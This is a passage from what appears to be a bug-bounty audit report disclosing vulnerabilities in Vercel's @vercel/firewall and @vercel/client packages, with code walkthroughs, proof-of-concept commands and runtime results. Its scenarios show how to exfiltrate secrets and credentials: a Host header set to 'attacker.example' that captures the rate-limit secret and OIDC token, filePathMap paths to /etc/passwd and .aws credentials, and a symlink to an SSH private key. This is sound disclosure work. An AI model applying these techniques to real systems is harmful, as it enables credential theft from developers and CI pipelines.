1. **Step 1 — Unvalidated `Host` Header Interpolation Into Outbound HTTPS Authority (`packages/firewall/src/rate-limit.ts:138-167, 224`):** When `process.env.VERCEL_ENV !== 'production'` (such as staging, preview, self-hosted Kubernetes/Docker, or custom reverse-proxy deployments where `request` or `headers` is passed to `checkRateLimit()`), `resolveFirewallHost()` extracts `request.headers.get('host')` and constructs `const endpoint = \`https://${firewallHost}${pathPrefix}/.well-known/vercel/rate-limit/check\``.
2. **Step 2 — Exfiltration of `VF_RATE_LIMIT_SECRET` and `x-vercel-oidc-token` (`rate-limit.ts:169-183`):** `buildAuthHeaders()` attaches `x-vercel-rate-limit-secret: process.env.VF_RATE_LIMIT_SECRET` and `x-vercel-oidc-token` to that outbound `POST` request, delivering both secrets directly to the attacker's host.
3. **Step 3 — Universal Fail-Open Rate-Limit Bypass (`{ rateLimited: false }`) & Go `ipc-proxy` Uninterpolated `api-%s.vercel.com` Bug (`rate-limit.ts:242-284`, `cmd/ipc-proxy/client.go:34-41`):** Whenever the outbound request fails or returns `>= 400` (e.g., when an attacker sends `Host: localhost/@attacker` even in `VERCEL_ENV=production`), `callRemoteRateLimitAPI()` catches the error and returns `{ rateLimited: false, error: 'not_found' }`, completely bypassing rate limiting! Additionally, `cmd/ipc-proxy/client.go:38` assigns `endpoint = apiEndpointFmt` (`"https://api-%s.vercel.com/v1/rate-limit"`) as a literal string with a raw `%s` instead of `fmt.Sprintf(apiEndpointFmt, region)`.

```typescript
// File: packages/firewall/src/rate-limit.ts (lines 138-167, 211-285)
function resolveFirewallHost(options: RateLimitOptions): string | null {
  if (process.env.VERCEL_ENV !== 'production') {
    const host = extractHostFromHeaders(options.headers) ?? extractHostFromRequest(options.request);
    if (host) return host; // BUG: Unvalidated Host header used directly as HTTPS target authority!
  }
  return process.env.VERCEL_URL || null;
}
// In callRemoteRateLimitAPI():
const endpoint = `https://${firewallHost}${pathPrefix}/.well-known/vercel/rate-limit/check`;
const response = await fetch(endpoint, { method: 'POST', headers: authHeaders, body: ... });
// BUG: On any error or >=400 status, fails open with { rateLimited: false }!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Staging / Preview / Self-Hosted `VF_RATE_LIMIT_SECRET` & OIDC Token Exfiltration:** An application calls `await checkRateLimit('login-limit', { request })`. An attacker sends `Host: 127.0.0.1:44123` (or `attacker.example`). `@vercel/firewall` sends `POST https://attacker.example/.well-known/vercel/rate-limit/check` carrying `x-vercel-rate-limit-secret: rl_secret_LIVE_99887766` and `x-vercel-oidc-token`.
* **Scenario B — Production Brute-Force / OTP Rate-Limit Bypass via `Host` Path/Userinfo Injection (`rateLimited: false`):** Even when `VERCEL_ENV=production` uses `api-${region}.vercel.com`, `extractHost()` passes the inbound `Host` header into the request metadata/URL path (`/@bypass`), causing a `400`/`404` response that `checkRateLimit()` catches and turns into `{ rateLimited: false }`, allowing unlimited OTP/password brute-forcing.
* **Scenario C — Go `ipc-proxy` Regional Endpoint Failure (`https://api-%s.vercel.com/v1/rate-limit`):** Setting `VERCEL_REGION=iad1` without `FIREWALL_API_ENDPOINT` causes `cmd/ipc-proxy/client.go:38` to dial the literal unformatted string `https://api-%s.vercel.com/v1/rate-limit`, failing every regional rate-limit check.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect rate-limit.js in published @vercel/firewall@1.2.6 and cmd/ipc-proxy/client.go
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/firewall/dist/rate-limit.js | sed -n '90,220p'

# 2. Run the Live @vercel/firewall@1.2.6 End-to-End Verification Harness
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-01-firewall-host-region-ssrf-and-ipc-proxy.patch
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "VERCEL-FIREWALL-01": {
    "RED": {
      "package_tested": "@vercel/firewall@1.2.6",
      "attacker_received_request": true,
      "leaked_rate_limit_secret": "rl_secret_LIVE_99887766",
      "leaked_oidc_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.LIVE_OIDC_PAYLOAD",
      "fail_open_result_on_error": {
        "rateLimited": false,
        "error": "not_found"
      }
    },
    "GREEN": {
      "untrusted_host_and_region_rejected": true,
      "attacker_received_request": false,
      "go_ipc_proxy_sprintf_formatted": true
    }
  }
}
```


---

### III.45 — vercel/vercel (`@vercel/client <= 18.10.0 (verified on published npm @vercel/client@18.10.0)`) — Vercel `@vercel/client@18.10.0` Prebuilt `.vc-config.json` `filePathMap` Arbitrary Host File Read & `.next/required-server-files.json` Local `.env` Secret Upload (`VERCEL-CLIENT-08A`) (`CWE-200 / CWE-706`, CVSS `5.0 Medium`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `vercel/vercel` (`npm / Node.js: @vercel/client`)
* **Affected Versions & Components:** `<= 18.10.0 (verified on published npm @vercel/client@18.10.0)` — `packages/client/src/utils/hashes.ts:115-167`, `packages/client/src/deploy.ts:127-195` (`filesFromFilePathMap`)
* **Vulnerability Class & Score:** `CWE-200 / CWE-706` — **CVSS v3.1: `5.0 Medium`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md`](advisories/zh-CN/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unconfined `path.resolve(cwd, filePath)` in `filesFromFilePathMap()` (`packages/client/src/utils/hashes.ts:115-167`):** When `prebuilt: true` (`vercel deploy --prebuilt`), `@vercel/client` parses `.vercel/output/functions/**/.vc-config.json` and iterates over `Object.entries(vcConfig.filePathMap)`. For each entry, it computes `const fsPath = path.resolve(cwd, filePath)` and reads the file (`fs.readFile(fsPath)`) without checking that `fsPath` is inside `cwd` or filtering against `.vercelignore`.
2. **Step 2 — Default Next.js `.next/required-server-files.json` Secret Leakage:** Even on an unmodified Next.js build, `.vc-config.json`'s `filePathMap` includes `.next/required-server-files.json`, which serializes local `config.env` values from `.env` / `.env.local` despite `.vercelignore` excluding `.env*`.
3. **Step 3 — CI/CD Prebuilt Artifact Poisoning (`POST /v2/files` Upload):** If a CI build step or reusable workflow generates `.vercel/output` and hands it to a deployment job running `vercel deploy --prebuilt --token $VERCEL_TOKEN`, any `../../../../etc/passwd` or `~/.aws/credentials` entry in `filePathMap` is SHA-1 hashed and uploaded to Vercel's `/v2/files` deployment API.

```typescript
// File: packages/client/src/utils/hashes.ts (lines 115-167)
export async function filesFromFilePathMap(
  filePathMap: Record<string, string>,
  cwd: string
): Promise<Map<string, DeploymentFile>> {
  for (const [funcPath, filePath] of Object.entries(filePathMap)) {
    // BUG: No check that fsPath stays within cwd, and .vercelignore is never applied!
    const fsPath = path.resolve(cwd, filePath);
    const data = await fs.readFile(fsPath);
    // ... packages data for upload to POST /v2/files
  }
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Default `vercel build && vercel deploy --prebuilt` `.env.local` Secret Leakage:** A developer adds `.env*` to `.vercelignore` expecting local secrets to stay off the deployment server, but `filePathMap` pulls `.next/required-server-files.json` containing `DATABASE_URL` and `STRIPE_SECRET_KEY` into the uploaded function bundle.
* **Scenario B — Split CI/CD Pipeline (`build` PR Artifact -> `deploy --prebuilt` Privileged Job) Host Credential Exfiltration:** An unprivileged PR build job outputs `.vercel/output` as a workflow artifact with `filePathMap: { "leaked.txt": "/home/runner/.npmrc" }`. The privileged deploy job runs `vercel deploy --prebuilt`, uploading the runner's credentials into the deployed function.
* **Scenario C — Monorepo Shared Cache / Turborepo Remote Cache Poisoning:** A poisoned `.vc-config.json` restored from a shared build cache exfiltrates CI environment files during prebuilt deployment.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect filesFromFilePathMap in published @vercel/client@18.10.0
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/client/dist/utils/hashes.js | sed -n '85,145p'

# 2. Run the Live @vercel/client@18.10.0 End-to-End Verification Harness
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-08-client-prebuilt-path-and-symlink-confinement.patch
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "VERCEL-CLIENT-08A": {
    "RED": {
      "package_tested": "@vercel/client@18.10.0",
      "outside_host_file_read_via_filePathMap": true,
      "dotnext_required_server_files_env_uploaded": true,
      "uploaded_payload_excerpt": "SUPER_SECRET_HOST_TOKEN=host_secret_value_12345"
    },
    "GREEN": {
      "outside_cwd_filePathMap_rejected": true,
      "outside_host_file_read_via_filePathMap": false
    }
  }
}
```


---

### III.46 — vercel/vercel (`@vercel/client <= 18.10.0 (verified on published npm @vercel/client@18.10.0)`) — Vercel `@vercel/client@18.10.0` Prebuilt `config.bulkRedirectsPath` Symlink Escape & `.vercelignore` Bypass Uploading Arbitrary Host Files (`VERCEL-CLIENT-08B`) (`CWE-59 / CWE-200`, CVSS `5.0 Medium`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `vercel/vercel` (`npm / Node.js: @vercel/client`)
* **Affected Versions & Components:** `<= 18.10.0 (verified on published npm @vercel/client@18.10.0)` — `packages/client/src/utils/index.ts:116-148`, `packages/client/src/deploy.ts:145-195` (`buildFileTree` / `bulkRedirectsPath`)
* **Vulnerability Class & Score:** `CWE-59 / CWE-200` — **CVSS v3.1: `5.0 Medium`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md`](advisories/zh-CN/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unvalidated `config.bulkRedirectsPath` & Symlink Following in `buildFileTree()` (`packages/client/src/utils/index.ts:116-148`):** In `buildFileTree()`, when `prebuilt` is `true`, `@vercel/client` reads `.vercel/output/config.json` and resolves `const bulkRedirectsRoot = join(cwd, config.bulkRedirectsPath)`. It then recursively walks `bulkRedirectsRoot` using `fs.stat()` (which transparently dereferences symlinks to files/directories outside `cwd`) without checking `fs.realpath()` confinement.
2. **Step 2 — Complete `.vercelignore` Bypass in Prebuilt Mode:** The `prebuilt` branch of `buildFileTree()` passes a no-op ignore filter when enumerating `bulkRedirectsPath`, uploading sensitive files (`id_rsa`, `.env.production`) even when explicitly listed in `.vercelignore`.
3. **Step 3 — External File Packaging & Upload to `/v2/files`:** Every file discovered under the symlinked or traversed `bulkRedirectsPath` is hashed (`hashes()`) and uploaded to Vercel's `/v2/files` deployment API.

```typescript
// File: packages/client/src/utils/index.ts (lines 116-148)
if (config?.bulkRedirectsPath) {
  const bulkRedirectsPath = join(cwd, config.bulkRedirectsPath);
  // BUG: No realpath confinement check and .vercelignore is not applied;
  // readdir/stat follows symlinks pointing outside cwd!
  const bulkRedirectFiles = await readdir(bulkRedirectsPath, []);
  fileList.push(...bulkRedirectFiles);
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Symlink inside `bulkRedirectsPath` Exfiltrating Host SSH/Cloud Credentials During `vercel deploy --prebuilt`:** A prebuilt output directory sets `"bulkRedirectsPath": ".vercel/output/redirects"` containing a symlink `leak.json -> /home/runner/.ssh/id_rsa`. `buildFileTree()` follows the symlink via `fs.stat()` and uploads the private key to the deployment.
* **Scenario B — Relative Path Traversal in `.vercel/output/config.json` (`"bulkRedirectsPath": "../../secrets"`):** Setting `bulkRedirectsPath` to a parent directory walks and uploads all files in that host directory.
* **Scenario C — `.vercelignore` Bypass for Local Secret Files:** Files explicitly excluded by `.vercelignore` are still packaged when referenced via `bulkRedirectsPath`.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect buildFileTree in published @vercel/client@18.10.0
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/client/dist/utils/index.js | sed -n '90,145p'

# 2. Run the Live @vercel/client@18.10.0 End-to-End Verification Harness
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-08-client-prebuilt-path-and-symlink-confinement.patch
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "VERCEL-CLIENT-08B": {
    "RED": {
      "package_tested": "@vercel/client@18.10.0",
      "bulkRedirectsPath_symlink_followed_outside_cwd": true,
      "outside_symlink_target_packaged_in_fileList": true,
      "uploaded_payload_excerpt": "OUTSIDE_SYMLINK_SECRET=top_secret_symlink_data_999"
    },
    "GREEN": {
      "bulkRedirectsPath_confined_to_cwd_realpath": true,
      "outside_symlink_target_packaged_in_fileList": false
    }
  }
}
```

<!-- VERCEL-ADVISORIES-END -->
